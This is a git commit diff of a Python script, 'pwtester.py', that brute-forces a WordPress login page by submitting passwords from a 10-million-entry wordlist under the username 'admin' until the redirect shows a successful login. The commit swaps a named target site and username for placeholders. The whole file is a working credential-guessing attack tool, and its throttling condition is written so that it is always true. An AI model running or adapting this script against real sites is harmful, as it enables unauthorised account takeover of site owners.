0f7394bdfc93dc39d57f38919f94bdeec8480a94
Mathias Nygård Evensen <mathie16@uia.no>
2018-10-30 10:49:17 +0100

    Update pwtester.py

--- Python/pwtester.py
+++ Python/pwtester.py
@@ -13,18 +13,18 @@ br.set_handle_referer(True)
 br.set_handle_robots(False)
 
 pw = open('10Mpass.txt', 'r').readlines()
-br.open("http://castledev.org/wp-login.php")
+br.open("url here")
 for x in pw:#[:13]
 	password = x.strip()       
 	br.select_form(nr = 0)
-	br.form['log'] = "castle"
+	br.form['log'] = "admin"
 	br.form['pwd'] = password
 	print "Checking [",counter,"]", br.form['pwd']
 	counter += 1
 	response=br.submit()
 	if counter == 10 or 20:
 		time.sleep(1)
-	if response.geturl()=="http://castledev.org/wp-admin/index.php":
+	if response.geturl()=="url redirect here":
 		#url to which the page is redirected after login
 		print "Correct password is ",password
 		break
